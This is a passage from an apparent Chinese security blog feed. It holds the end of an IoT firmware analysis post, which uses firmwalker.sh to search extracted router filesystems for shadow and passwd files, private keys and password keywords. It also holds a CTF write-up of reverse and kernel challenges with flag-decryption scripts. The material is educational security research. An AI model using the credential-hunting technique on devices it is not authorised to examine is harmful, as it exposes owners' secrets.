src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154715261.png" alt="image-20210310154715261"></p><h1 id="0x05-敏感信息分析"><a href="#0x05-敏感信息分析" class="headerlink" title="0x05 敏感信息分析"></a>0x05 敏感信息分析</h1><p>可以看到文件系统都被提取出来了 这里介绍一个常用的小工具 firmwalk.sh 它将搜索固件文件系统，以获取与敏感信息相关的东西，如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">etc&#x2F;shadow and etc&#x2F;passwd</span><br><span class="line">列出 etc&#x2F;ssl 目录</span><br><span class="line">搜索相关的文件，如. pem,. crt, 等。</span><br><span class="line">搜索配置文件</span><br><span class="line">查找脚本文件</span><br><span class="line">搜索其他. bin 文件</span><br><span class="line">查找诸如管理员。密码。远程等关键字。</span><br><span class="line">搜索在 IoT 设备上使用的通用网络服务器</span><br><span class="line">搜索常见的二进制文件，如 ssh。tftp。dropbear 等。</span><br><span class="line">搜索网址，电子邮件地址和 IP 地址</span><br></pre></td></tr></table></figure><p>我们可以使用它来看看这个文件系统中有哪些敏感信息 命令为./firmwalker.sh 文件系统的路径</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155058406.png" alt="image-20210310155058406"></p><p>password关键字文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155209933.png" alt="image-20210310155209933" style="zoom:50%;"><p>ssl相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155231701.png" alt="image-20210310155231701" style="zoom:50%;"><p>私钥相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155302852.png" alt="image-20210310155302852" style="zoom:50%;"><p>telnel相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155344902.png" alt="image-20210310155344902" style="zoom:50%;">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-实验目的&quot;&gt;&lt;a href=&quot;#0x01-实验目的&quot; class=&quot;headerlink&quot; title=&quot;0x01 实验目的&quot;&gt;&lt;/a&gt;0x01 实验目的&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x02-概述&quot;&gt;&lt;a href=&quot;#0x02-概述&quot; class=&quot;headerlink&quot; title=&quot;0x02 概述&quot;&gt;&lt;/a&gt;0x02 概述&lt;/h1&gt;&lt;p&gt;固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310145532897.png&quot; alt=&quot;image-20210310145532897&quot;&gt;&lt;/p&gt;
&lt;p&gt;是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="固件" scheme="http://www.ol4three.com/tags/%E5%9B%BA%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>2020-HWS-冬令营线上赛WP</title>
    <link href="http://www.ol4three.com/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/"/>
    <id>http://www.ol4three.com/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/</id>
    <published>2021-02-13T03:09:12.000Z</published>
    <updated>2021-03-04T11:30:04.440Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。</p></blockquote><ul><li>HWS冬令营介绍：<a href="https://mp.weixin.qq.com/s/9FNjVBNZAElZGrPxtsX19A">HWS计划2021硬件安全冬令营重磅回归！</a></li><li>入营赛题目附件：<a href="https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip">HWS20210128.zip</a></li></ul><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h2><blockquote><p>x86windows</p><p>考点：</p><p>加法的位运算实现</p><p>单子节爆破</p></blockquote><p>主要加密逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 31; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v2 &#x3D; i ^ a2[i];</span><br><span class="line">  v3 &#x3D; i &amp; a2[i];</span><br><span class="line">  v7 &#x3D; a2[i];</span><br><span class="line">  v6 &#x3D; i;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; 2 * (v6 &amp; v7);</span><br><span class="line">    v7 ^&#x3D; v6;</span><br><span class="line">    v6 &#x3D; v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 );</span><br><span class="line">  result &#x3D; &amp;a1[i];</span><br><span class="line">  a1[i] &#x3D; v7 ^ 0x23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>加密算法无法一眼看出对应的运算，直接写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">        v6 = i</span><br><span class="line">        v7 = j</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            v4 = <span class="number">2</span> * (v6 &amp; v7)</span><br><span class="line">            v7 = v7 ^ v6</span><br><span class="line">            v6 = v4</span><br><span class="line">            <span class="keyword">if</span> v4 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> v7 ^ <span class="number">0x23</span> == buf[i]:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % flag)</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果了解过加法的位运算实现的话，可以发现encrypt函数实际上是把对应input[i]加上i在异或，我们可以写出对应的逆运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">char decrypt(char c1,int i)&#123;</span><br><span class="line">    return (c1 ^ 0x23) - i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[40] &#x3D; &quot;\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x52\x66\x1D\x52\x66\x67\x68\x67\x65\x6F\x5F\x59\x58\x5E\x6D\x70\xA1\x6E\x70\xA3&quot;;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 32; i++)&#123;</span><br><span class="line">        putchar(decrypt(buf[i],i));</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ofbu"><a href="#ofbu" class="headerlink" title="ofbu"></a>ofbu</h2><h1 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h1><p>第一次做内核，基础学习文章如下：</p><ul><li><a href="https://lantern.cool/note-pwn-kernel-basics/">Linux Kernel Basics</a></li><li><a href="https://beafb1b1.github.io/kernel/linux_kernel_base/">linux内核基础</a></li><li><a href="https://lantern.cool/note-pwn-kernel-environment/">Linux Kernel 环境配置及调试</a></li><li><a href="https://bbs.pediy.com/thread-261586.htm">Linux Kernel Pwn 学习笔记(栈溢出)</a></li><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/08/24/gdb/">HWS夏令营 之 GDB调一切: 调试linux内核</a></li></ul><p>基础练习题目如下：</p><ul><li>练习文章：<a href="https://xz.aliyun.com/t/7625">Linux Kernel Pwn 初探</a></li><li>配套题目：链接:<a href="https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA">https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA</a> 密码:q58k</li></ul><p>进阶练习题目如下：ISCN2017 - babydriver、2018 强网杯 - core、2018 0CTF Finals Baby Kernel</p><ul><li><a href="https://lantern.cool/note-pwn-kernel-UAF/">Linux Kernel UAF <strong>CISCN2017 - babydriver</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-smep/">Linux Kernel bypass-smep <strong>CISCN2017 - babydriver</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-rop/">Linux Kernel ROP <strong>2018 强网杯 - core</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-ret2usr/">Linux Kernel ret2usr <strong>2018 强网杯 - core</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-double-fetch/">Linux Kernel Double Fetch <strong>2018 0CTF Finals Baby Kernel</strong></a></li></ul><h2 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h2><p>逻辑总共为4个步骤</p><ol><li>输入flag</li><li>加载驱动，调用驱动中的函数加密flag</li><li>长调用，加密密文</li><li>Check，对比结果</li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114311164.png" alt="image-20210304114311164"></p><h3 id="驱动调用"><a href="#驱动调用" class="headerlink" title="驱动调用"></a>驱动调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114327405.png" alt="image-20210304114327405"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304113617543.png" alt="image-20210304113617543"></p><h3 id="查看驱动"><a href="#查看驱动" class="headerlink" title="查看驱动"></a>查看驱动</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114358052.png" alt="image-20210304114358052"></p><p><strong>最终调用的加密函数是驱动的sub_401340</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114503572.png" alt="image-20210304114503572"></p><p>参数分别是ring3传进来的  sub_401005(-1, &amp;v7, aAglfTTon5iSiht, 32, v4, &amp;Buf1);</p><p>V7是输入的flag，Buf1是加密的结果，aAglfTTon5iSiht是字符串常量<code>&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf</code>，32是长度</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114649560.png" alt="image-20210304114649560"></p><p>依据相关的加密算法的特征，可判别sub_401710是des spankey函数，sub_401620是des encrypt函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121153289.png" alt="image-20210304121153289"></p><h3 id="长调用"><a href="#长调用" class="headerlink" title="长调用"></a>长调用</h3><p>利用call fwrod 返回用 retf</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121619358.png" alt="image-20210304121619358"></p><p>调用的是ring3下图的函数，功能很简单，就是一个简单的xor</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121657064.png" alt="image-20210304121657064"></p><p>解密脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf&#39;[:8]</span><br><span class="line">c&#x3D;[0xB2, 0xC4, 0x86, 0xD5, 0x54, 0x6C, 0x38, 0xAD, 0xBD, 0x69, 0xD4, 0xE9, 0x44, 0x47, 0x36, 0x21, 0x99, 0x91, 0xFB, 0x13, 0x70, 0xD8, 0x6B, 0xE4, 0x80, 0x12, 0xE2, 0x43, 0x2A, 0x4B, 0x49, 0x8E]</span><br><span class="line">for i in range(0x1e,-1,-1):</span><br><span class="line">    c[i]^&#x3D;c[i+1]</span><br><span class="line">cipher&#x3D;&#39;&#39;.join(list(map(chr,c)))</span><br><span class="line">des&#x3D;DES.new(key)</span><br><span class="line">flag&#x3D;des.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#">https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;HWS冬令营介绍：&lt;a href=&quot;https://mp.weixin.qq.com/s/9FNjVBNZAElZGrPxtsX19A&quot;&gt;HWS计划2021硬件安全冬令营重磅回归！&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;入营赛题目附件：&lt;a href=&quot;https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip&quot;&gt;HWS20210128.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.ol4three.com/categories/CTF/"/>
    
    
      <category term="HWS" scheme="http://www.ol4three.com/tags/HWS/"/>
    
  </entry>
  
</feed>
